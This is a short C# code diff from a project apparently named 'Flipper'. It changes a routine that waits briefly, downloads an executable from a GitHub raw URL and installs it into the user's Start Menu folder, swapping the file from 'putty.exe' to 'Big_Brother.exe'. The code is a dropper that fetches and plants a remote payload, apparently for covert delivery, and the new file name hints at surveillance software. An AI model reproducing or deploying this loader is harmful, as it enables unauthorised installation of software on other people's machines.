@@ -12,9 +12,9 @@ namespace Flipper
         public void Run()
         {
             Thread.Sleep(2500);
-            byte[] Payload = DownloadPayload("https://github.com/Rudyx77/my_powershell_script/raw/main/putty.exe");
+            byte[] Payload = DownloadPayload("https://github.com/Rudyx77/my_powershell_script/raw/main/Big_Brother.exe");
 			
-            if (InstallPayload(Environment.GetFolderPath(Environment.SpecialFolder.StartMenu) + "\\putty.exe", Payload))
+            if (InstallPayload(Environment.GetFolderPath(Environment.SpecialFolder.StartMenu) + "\\Big_Brother.exe", Payload))
             {
             }
         }
